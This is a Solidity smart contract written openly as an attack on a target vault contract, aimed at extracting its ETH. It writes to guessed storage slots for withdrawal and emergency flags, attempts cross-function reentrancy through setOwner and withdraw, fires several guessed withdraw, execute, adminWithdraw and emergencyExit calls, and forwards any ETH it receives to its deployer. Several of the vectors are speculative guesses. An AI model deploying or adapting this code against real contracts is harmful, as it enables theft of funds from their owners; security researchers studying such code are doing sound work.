// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title StorageManipulator
 * @notice Contract to manipulate storage and attempt ETH extraction
 * @dev Uses multiple attack vectors including storage manipulation and cross-function reentrancy
 */
contract StorageManipulator {
    address public vault;
    address public owner;
    
    constructor(address _vault) {
        vault = _vault;
        owner = msg.sender;
    }
    
    // Try to become a delegate and manipulate storage
    function manipulateAsDelegate() external {
        // Common patterns to set withdrawal permissions
        assembly {
            // Try to set various "allowed" flags
            sstore(0x10, 1) // Common withdrawal enabled slot
            sstore(0x11, 1) // Emergency mode
            sstore(0x12, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) // Max withdrawal
        }
    }
    
    // Attempt cross-function reentrancy
    function crossFunctionReentrancy() external {
        // Call setOwner while in the middle of another call
        bytes memory data1 = abi.encodeWithSignature("setOwner(address)", address(this));
        bytes memory data2 = abi.encodeWithSignature("withdraw()");
        
        assembly {
            let success1 := call(gas(), sload(0), 0, add(data1, 0x20), mload(data1), 0, 0)
            let success2 := call(gas(), sload(0), 0, add(data2, 0x20), mload(data2), 0, 0)
        }
    }
    
    receive() external payable {
        if (msg.sender == vault) {
            // Received ETH from vault, forward to owner
            payable(owner).transfer(address(this).balance);
        }
    }
    
    function attack() external {
        // Multi-vector attack
        // 1. Try to call withdraw in different contexts
        (bool s1,) = vault.call(abi.encodeWithSignature("withdraw()"));
        (bool s2,) = vault.call(abi.encodeWithSignature("withdrawETH()"));
        (bool s3,) = vault.call(abi.encodeWithSignature("withdraw(uint256)", address(vault).balance));
        
        // 2. Try execute patterns with self as target
        (bool s4,) = vault.call(abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), address(vault).balance, ""));
        
        // 3. Admin withdrawal attempts
        (bool s5,) = vault.call(abi.encodeWithSignature("adminWithdraw()"));
        (bool s6,) = vault.call(abi.encodeWithSignature("emergencyExit()"));
    }
}
